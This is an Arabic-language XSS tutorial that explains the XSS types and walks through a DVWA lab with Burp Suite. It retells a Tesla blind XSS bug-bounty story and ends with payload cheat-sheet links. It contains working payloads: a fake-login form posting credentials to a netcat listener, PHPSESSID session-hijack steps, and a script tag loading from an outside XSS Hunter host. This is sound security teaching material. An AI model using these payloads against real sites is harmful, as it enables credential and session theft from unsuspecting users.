---
tags:
  - injection
---
---
## 🎯 مفاهيم XSS

تخيل عندك موقع بسيط معمول بـ HTML و CSS. لما تفتحه، المتصفح بيرندرهم وتظهرلك الصفحة… بس دلوقتي أغلب المواقع بقت ديناميكية شوية.

يعني مثلًا:
- بتسحب بيانات من قاعدة بيانات.
- أو بتطلب إدخال من اليوزر وبتستخدمه في الصفحة.

مثال:  
فيه فورم، اليوزر يكتب فيه حاجة، والموقع ياخد البيانات دي ويحطها في صفحة تانية من خلال الـ URL.  
الصفحة التانية تمسك الـ URL وتطلع منه البيانات، وتحطها جوه الصفحة.

لو البيانات دي بتدخل جوه كود HTML، كده اليوزر ممكن يعدل في شكل الصفحة أو محتواها.

ولو المطور قال: "عايز أضيف سكريبت هنا عشان أزود ميزة" – غالبًا يحطه في الهيدر أو الفوتر، بس ممكن يتحط في أي حتة في الصفحة.

معناه إيه؟  
لو الدنيا ماشية كده، ممكن حد يستغل ده ويبعت كود خبيث (script) من خلال فورم أو URL ويعدّل في سلوك الموقع!

المتصفح هيفكر إن الكود ده جزء من الصفحة، وهيشغله!

وده ببساطة اللي اسمه **Cross-Site Scripting** ✨

---

## 💡 تعريف XSS
XSS (Cross-Site Scripting) هو نوع من هجمات **الحقن** (Injection) بيتم فيها إدخال سكريبت خبيث في موقع موثوق، والمتصفح بتاع الضحية بيشغله.

يعني؟  
تخيل موقع بسيط وآمن، وجه هاكر استغل حاجة فيه وبعت كود خبيث لليوزر اللي بيدخل عليه.

الكود ده بيشتغل جوا المتصفح، مش جوا السيرفر، فالسيرفر نفسه مفيهوش حاجة، بس بيتحول لأداة لعرض الكود الخبيث للمستخدمين.

وده بيتم يا إما:
## 🧠 أنواع XSS

في 3 أنواع رئيسية:

1. **Reflected XSS**  
الكود الخبيث بيرجع فورًا في الصفحة من نفس الريكوست (بيظهر في الـ URL مثلاً).  
 غالبًا بيستخدم في التصيد "Phishing".  
2. **Stored XSS**  
 الكود بيتخزن في قاعدة البيانات أو السيرفر، ولما حد يزور الصفحة يتعرض ليه.  
 خطير لأنه بيوصل لعدد كبير من الناس.
 
3. **DOM-Based XSS**  
الكود بيتنفذ جوه المتصفح نفسه من غير ما يوصل للسيرفر أصلًا، بيتم التلاعب بالـ DOM.
وحتى في النوع اللي الكود بيتخزن، السيرفر مش بيبقى مصاب، لكن المستخدم اللي يدخل على صفحة بتستدعي الكود الخبيث هو اللي بيتضر.

---

## 🕵️ إمتى بيحصل XSS؟

زي أي هجوم Injection، XSS بيحصل لما الموقع ياخد مدخل من اليوزر ويحطه في الصفحة من غير ما:
- يعمل **Validation** (يتأكد من نوع البيانات)
- أو **Encoding** (يحوّل الرموز زي `<`, `>` لحاجة آمنة)

الموقع بيستقبل الكلام من اليوزر، بس لو اليوزر دخل حاجة مش متوقعة – زي كود HTML أو JavaScript – بيكسره.

### مثال:
- متوقع: `userName`
- المخرَج: `Hello, userName!`
- مدخل خبيث: `Bob<script>alert(1)</script>`
- المخرَج: بوب ويطلع بوكس فيه رقم ١

---

## المتصفحات الحديثة :
فيه متصفحات دلوقتي عندها حماية ضد XSS، بس مش كاملة. ولسه في الواقع بنلاقي مواقع فيها الثغرة دي.
حسب OWASP Top 10، دي واحدة من أكتر الثغرات انتشارًا، رقم 2 في القائمة، وتأثيرها بيتراوح من خفيف لخطير.

---

## 💥 تأثير XSS : 
لما هجوم XSS ينجح، ممكن يعمل حاجات كتير زي:
1. يسرق الكوكيز أو بيانات الجلسة (session tokens)
2. يخلي الهاكر يسجل دخول مكانك
3. يسرق باسوردات أو بيانات كروت
4. يحولك على موقع مزيف شبه الأصلي
5. يعدل شكل الموقع
6. يخدعك تدخل بياناتك في فورم مزيف
7. يسجل ضربات الكيبورد (keystrokes) من خلال `addEventListener`
---
## 💻 أمثلة على XSS
السكريبتات دي مثال على الثغرة، وغالبًا بتستخدم كـ "Proof of Concept" مش هجوم فعلي:

`<script>alert("xss")</script>`

أو:


`<script src=javascript:alert("xss")></script>`

وممكن تيجي من خلال URL زي:

php-template

`https://example.com/search?query=<script>alert("XSS")</script>`

أو من خلال input في الموقع.

---

## 🧾 الخلاصة :

- XSS =
- سكريبت خبيث بيشتغل جوا المتصفح.
- السيرفر مش مصاب، بس بيعرض الكود للمستخدم.
- ممكن يسرق بيانات، يعدل الصفحة، أو يخدع اليوزر.
- الحل = فلترة وتشفير المدخلات، واستخدام أدوات حماية المتصفحات.

----
# 🧪 تجربة Manual Stored XSS – في DVWA

### 💬 المشهد العام:
إحنا دلوقتي في تبويب **XSS (Stored)** في موقع DVWA التجريبي، وبنشوف فورم زي "دفتر زوار" أو "قسم تعليقات"، زي اللي بنشوفه في الريفيوهات أو المنتديات.

فكرة الهجوم هنا إننا نحط كود XSS، وكل ما حد يفتح الصفحة الكود يشتغل تلقائي ويبعته معلوماته على سيرفر الهاكر.

---

## 🔍 نبدأ نختبر الفورم:

كتبنا مثلًا:

```
Test
Hello, this is a test comment...
```

بس لقينا فيه حد أقصى لعدد الحروف، وده هيصعب إننا نحط Payload كبير.
لكن خلي بالك:

- **الفرونت إند** (HTML أو JavaScript) ممكن يمنعك تكتب عدد معين من الحروف.
- بس **الباك إند** ممكن مايكونش فيه نفس المنع.
- يعني لو بعتنا الريكوست مباشرة للسيرفر، ممكن نعدي الحد ده.

🎯 فيه Cheat Sheet حلوة لـ Tiny Payloads:  

👉 [Tiny XSS Payloads](https://github.com/terjanq/Tiny-XSS-Payloads)

---

## ✅ اختبار بسيط على الـ Payloads:

جربنا نكتب:

```html
<svg onload=alert(1)>
```

وفعلًا الكود اشتغل!  
يعني كده عندنا **Stored XSS**، لأن الكود اتخزن، وكل مرة نفتح الصفحة بيرن من تاني.

---

## 🛠️ نستخدم **Burp Suite** بدل ZAP:

الخطوات هتكون كالتالي:

1. ✅ شغّل **Burp Suite**
2. ✅ من تبويب **Proxy > Intercept** اتأكد إن الـ Intercept شغّال
3. ✅ افتح متصفحك (مربوط بـ Burp – سواء FoxyProxy أو Manual Proxy على 127.0.0.1:8080)
4. ✅ افتح موقع **DVWA** على `127.0.0.1` وروح لتبويب **Stored XSS**
5. ✅ اكتب أي **تعليق تجريبي** واضغط على زر "Sign Guestbook"
6. 🛑 الـ Burp هيمسك الريكوست في تبويب **Intercept**
7. ✅ روح على **HTTP history** أو **Forward it** وبعدين افتح الريكوست في **Repeater** (كليك يمين → Send to Repeater)
8. ✏️ في الـ Repeater، عدّل قيمة `mtxMessage=` وخليها مثلاً:

```html
<IMG SRC=# onmouseover="alert('xss')">
```

فشكل الريكوست هيبقى زي كده:

```
POST /vulnerabilities/xss_s/ HTTP/1.1
Host: 127.0.0.1
...

txtName=xyz&mtxMessage=<IMG SRC=# onmouseover="alert('xss')">&btnSign=Sign+Guestbook
```

9. ✅ اضغط Send من الـ Repeater، وروح راجع الصفحة… هتلاقي الـ Payload ظهر فعلاً ومجرد ما المؤشر ييجي عليه، البوكس يطلع 😈

---

## 🎯 ليه استخدمنا Burp؟
- عشان **نتجاوز قيود الفرونت إند** (زي عدد الحروف أو الفاليديشن).
- ونبعت الريكوست زي ما إحنا عايزين مباشر على السيرف

---

## 🎭 نعمل Login مزيف ونسرق بيانات الدخول:

بدل ما ناخد الـ Cookies، نجرب نخدع اليوزر بـ login form مزيف:

```html
<h3>Please login to see</h3> 
<form action=http://127.0.0.1:4444>
Username:<br><input type="username" name="username"></br>
Password:<br><input type="password" name="password"></br>
<br><input type="submit" value="Logon"></br>
```

🔌 شغّل Netcat كده:

```bash
nc -lvp 4444
```

وابعت الريكوست بـ ZAP.

لما اليوزر يفتح الصفحة، هيتعرضله فورم دخول، وهيفتكر إنه لازم يدخل عشان يشوف المحتوى.
بيكتب بياناته، والبيانات بتتبعت عندنا مباشرة عالـ Netcat، **وكمان بناخد الكوكيز بتاعته** 😈

---

## 🧪 Bonus: نسرق Session ونسجل دخول مكانه:

لو خدنا قيمة `PHPSESSIمD` ن اليوزر، نقدر نسجل مكانه حتى لو معرفناش الباسورد.

### الخطوات:

1. افتح متصفح تاني
2. ادخل على DVWA، هيطلب منك تسجيل دخول
3. افتح DevTools (F12) وروح على **Storage**
4. غيّر قيمة الـ `PHPSESSID` للقيمة اللي سرقتها
5. ادخل على صفحة خاصة (زي لوحة التحكم)، وهتدخل تلقائي
6. 
لأن التطبيق فاكر إنك اليوزر ده أصلاً 🤯

---

## 🧠 خلاصة:

- Stored XSS أخطر من Reflected لأنه بيشتغل أوتوماتيك لأي يوزر يفتح الصفحة.
    
- ممكن تستخدمه لسرقة:
    - الـ Cookies
    - بيانات الدخول
    - السيشن
    - أو حتى تعرض فورم وهمي

- استخدام أدوات زي ZAP بيسهل إنك تعدي الـ frontend وتوصل للـ backend مباشرة.

---

---

## 👻 Blind XSS – قصة تسلا والـ 10,000 دولار

#### 🤔 إيه هو Blind XSS؟

في العادي، لما بنجرب XSS بنشوف النتيجة على طول قدامنا، يعني بيحصل **alert** أو بيتنفذ الكود قدام عينينا.  
لكن في **Blind XSS**، الكود بيتنفذ في مكان تاني خالص، واحنا مابنشوفش أي نتيجة مباشرة. لازم نستنى ونراقب ونشوف إذا كان الكود اشتغل ولا لأ.

---

#### 📚 القصة – تسلا وسام كاري

#### 👨‍💻 مين سام كاري؟

سام كاري باونتي هانتر مشهور، وشارك في برنامج مكافآت الثغرات بتاع تسلا. القصة دي واحدة من أشهر حكاياته.

### 🚗 البداية: تغيير اسم العربية

سام ماكنش لاقي ثغرات، فقرر يغيّر اسم عربيته على نظام تسلا، وكتب الاسم ده:

```html
"><script src=//zlz.xss.ht></script>
```

ده كود XSS، ومربوط بموقع اسمه **XSS Hunter** – أداة بتساعدك تراقب الـ Payloads وتشوف اتنفذوا فين وامتى.

### 😅 وبعدها نسي خالص إنه غير الاسم

عدّت شهور، وسام كان في رحلة وساعة ما حجر خبط العربية وكسّر الإزاز، راح **قدّم طلب دعم** من خلال تطبيق Tesla عشان يصلّحوه.

#### 📲 المفاجأة بتحصل

تاني يوم، جاتله رسالة من تسلا، ولقى **XSS Hunter بيبلّغه إن الكود اتنفذ** من دومين تابع لتسلا:

```
https://[مخفي].teslamotors.com
```

يعني موظف من تسلا فتح الصفحة اللي فيها بيانات عربية سام، والـ Payload اشتغل عنده.

XSS Hunter سجّل:

- لقطة شاشة  
- تفاصيل الصفحة
- وكل حاجة اتجمعت وقت تنفيذ الكود

### 👀 إيه اللي حصل فعليًا؟

الموظف فتح لوحة تحكم داخلية فيها بيانات عربية سام، والسكريبت اتنفذ جواه. وسام لاحظ إنه **ممكن يتخيل سيناريو يقدر فيه يخمن IDات العربيات التانية ويوصل لبياناتهم** كمان – بس هو ما جربش.

بلغ تسلا، وهما:

- نزلوا **hotfix** في أقل من 12 ساعة
- ودفعوله **$10,000** في خلال أسبوعين

---

#### 🧠 خلاصة اللي حصل:

1. سام غيّر اسم عربيته لـ XSS Payload
2. الكود اتنفذ لما موظف تسلا فتح بيانات عربيته
3. XSS Hunter بلغ سام أول ما الكود اشتغل
4. الأداة جابت له لقطة شاشة وكل التفاصيل اللي حصلت

وده مثال **ممتاز على Blind XSS** 🎯

---
#### 🤷 ليه Blind XSS مش نوع مختلف؟

هو مش نوع جديد، بس يعتبر **شكل من أشكال Stored XSS**، بس المختلف هنا إن الهاكر:
- ميعرفش الكود هيتنفذ ولا لأ
- ولا امتى
- ولا مين اللي هينفذه
علشان كده محتاج أداة زي **XSS Hunter** تراقب وتبلّغ أول ما الكود يشتغل.

---

---

علشان نختم الكورس، حبيت أسيبلك شوية مصادر مفيدة تساعدك تكمل لوحدك. في حاجات منهم إحنا شوفناها مع بعض قبل كده، وفي حاجات جديدة هتعجبك إن شاء الله، فأنصحك تبص عليهم بعد ما تخلص الكورس 👨‍💻💥

# 📌 **المصادر دي بتشمل حاجات زي:**

- شيتات فيها طرق التهرب من الفلاتر، وبيلودز، ودفاعات 
- تحديات XSS
- أدوات مفيدة
- سيرفرات ديسكورد
- وحاجات تانية كتير...

فيه كمان ألعاب أونلاين بتختبر قدراتك إنك تنفذ بيلودات XSS في بيئة مصممة إنها تبان "محمية"، وده هيخليك تفكر بذكاء وتفهم إزاي تتعامل مع الفلاتر الضعيفة أو الساذجة 😏💣

---

### 🎮 أول حاجة:

**XSS Pwn Function**  
🌐 [https://xss.pwnfunction.com/](https://xss.pwnfunction.com/)

الموقع ده جامد بجد! فيه تمارين للتسخين وبعدها تحديات حقيقية، وكمان فيه ترتيب للي بيكسبوا. حاول تجرب التحديات اللي فيه، هتخليك تتعلم حاجات كتير في السيناريوهات الواقعية 👑

وبعدين لو حبيت تتحدى نفسك أكتر، جرب ده كمان:  
🌐 [http://prompt.ml/0](http://prompt.ml/0)  
بيقولوا إنه أصعب شوية (بس أنا شخصيًا مجربتوش 😅)

---

### 📝 شيتات الـ XSS (Cheat Sheets)

- [شيت من vulnerability-lab](https://www.vulnerability-lab.com/resources/documents/531.txt)
- [شيت بيلودات XSS - PayloadBox](https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt)
- [شيت OWASP](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [شيت PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [Tiny XSS Payloads](https://github.com/terjanq/Tiny-XSS-Payloads)
    
- [مقالة XSS في 2020](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [تكنيكات لتخطي البلاك لست في JavaScript](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#javascript-bypass-blacklists-techniques)
- [تكنيكات تانية للبلاك لست](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#blacklist-bypasses)

---

### 🔧 أدوات ومصادر عامة

- [موقع CSP (Content Security Policy)](https://content-security-policy.com/)
- [مجموعة أدوات الويب (فيها أدوات XSS كمان)](https://github.com/hahwul/WebHackersWeapons)
- [قائمة رائعة لمصادر XSS](https://github.com/s0md3v/AwesomeXSS)
    

---

### 🏴‍☠️ لو ناوي تدخل الباج باونتي:
- [سيرفر ديسكورد Bounty Hunters](https://discord.com/invite/2Cfu6xykvz) — ناس محترمة وبيرحبوا بالكل
- [HackerOne 101](https://www.hackerone.com/for-hackers/hacker-101) — دروس تعليمية جامدة من HackerOne

---